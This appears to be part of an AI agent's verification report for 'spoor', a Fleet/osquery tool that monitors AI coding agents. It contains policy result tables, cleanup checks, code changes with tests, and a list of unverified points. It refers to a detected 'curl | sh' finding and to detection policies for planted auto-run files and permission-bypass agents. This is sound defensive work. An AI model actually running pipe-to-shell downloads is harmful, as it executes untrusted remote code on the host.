  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[08:12:32] == scenario removed (extension), state database from nowhere, removed
  state database removed: ls: cannot access '$S/fleetbin/run3/data/state.db': No such file or directory
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             not member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        member
  ok    spoor-c5-spoor tables unavailable                                      not member
[08:13:29] cleanup
[08:13:35] extension unregistered from $S/fleetstack/osq/extensions.load, osqueryd restarted
[08:13:35] agent options restored: identical to the saved copy
[08:13:35] objects named spoor-c5-* left on the server: labels 0, reports 0, policies []
[08:13:40] spoor tables registered on the host: 0
[08:13:40] done: 0 failed checks
```

### The shared server and host afterwards

Checked after the final run (the agent options are compared with the copy
saved before the first run, at 07:30):

```
$ diff <(saved agent options before the first run) <(fleetctl get config --json | jq .spec.agent_options)
identical
$ labels (name, type):
All Hosts	builtin;All Linux	builtin;Android	builtin;CentOS Linux	builtin;Fedora Linux	builtin;MS Windows	builtin;Red Hat Linux	builtin;Ubuntu Linux	builtin;chrome	builtin;iOS	builtin;iPadOS	builtin;macOS	builtin;macOS 14+ (Sonoma+)	builtin;
$ policies: 0, reports: 0
$ wc -c extensions.load: 0
$ fleetctl get hosts
| 5e8102a2-f0ef-46ef-a315-39f770849362 | vm       | ubuntu   | 5.19.0          | online |
$ live: osquery_extensions, spoor tables, osquery_info
[{"name":"core","type":"core"}]
[{"host_display_name":"vm","host_hostname":"vm","n":"0"}]
[{"version":"5.19.0","extensions":"active"}]
$ pgrep osqueryd
21738 $S/dl/osquery/opt/osquery/bin/osqueryd --flagfile=$S/fleetstack/osq/osquery.flags --allow_unsafe
$ ls -la /etc/spoor
ls: cannot access '/etc/spoor': No such file or directory
```

Labels are Fleet's builtin ones only; no policy or report exists, as
before the first run. `/etc/spoor` is gone. The data directories that held
records of this sandbox's own sessions (first run, trial scans) were deleted;
the container host, the logs and the final run's work directory remain under
`$S/fleetbin`.

### Changes in this pass

- `cmd/spoor/scan.go` (defect found with the binary): `spoor scan --state`
  loaded the installed signed bundle but did not pass its version to the
  pipeline, so the heartbeat of a fresh state database had `bundle_version`
  empty, and a scan-only host (tier 2 without the daemon) failed "rules
  bundle is current" with a current bundle installed. Now the scan's
  heartbeat names it, as the daemon's does. Test
  `TestScanStateRecordsBundleVersion` (before the fix: `scan heartbeat: mode
  "scan", bundle_version "", want scan and 7`). Seen with the binary in the
  container on a fresh database, bundle 1 installed and trusted: the scan's
  heartbeat had `bundle_version` `''` before the fix and `'1'` after.
- `deploy/fleet/verify.sh`: the binary mode above (signed bundle, "hook"
  scenario, table listing for "hook", the database source in each scenario
  line, a background daemon stopped on exit); `wait_tables N POLLS` gives up
  without ending the run, and a poll the host did not answer reads as `?`,
  never as 0 tables; tier 3 restarts osqueryd when ATC tables stay
  registered; cleanup reports spoor tables left on the host. Tests
  `TestVerifyShBinaryScenarios` (a fake binary records every call, the
  daemon being up when the hook runs, the payload and the configuration) and
  `TestVerifyShWaitTablesGivesUp` in `internal/fleetgen/scripts_test.go`.
- `test/e2e/fleet_test.go`: expectations for the "hook" scenario, and a
  failure if the stock profile loses the policy key it relies on.

### Not verified with the binary

- The healthy and hook databases were written by the binary in a container
  (this host's kernel, machine-id and hostname, a clean root), not from this
  sandbox's own accounts, for the reasons in the first run.
- The agent process is a copy of `sleep`. The healthy daemon runs 20 s,
  shorter than the engine's 60 s `BlindAfter`, so the idle process reads
  `partial`; a real agent idle for more than a minute after it starts reads
  `blind` until its first record (`internal/engine/doc.go`), which fails "no
  AI agent running unobserved".
- Only the curl | sh finding came from the binary. The planted findings of
  the other "no X" policies, and the 2-hour and 25-hour heartbeats, still
  come from the harness.
- The hook ran in observe mode; guard mode was not exercised here.
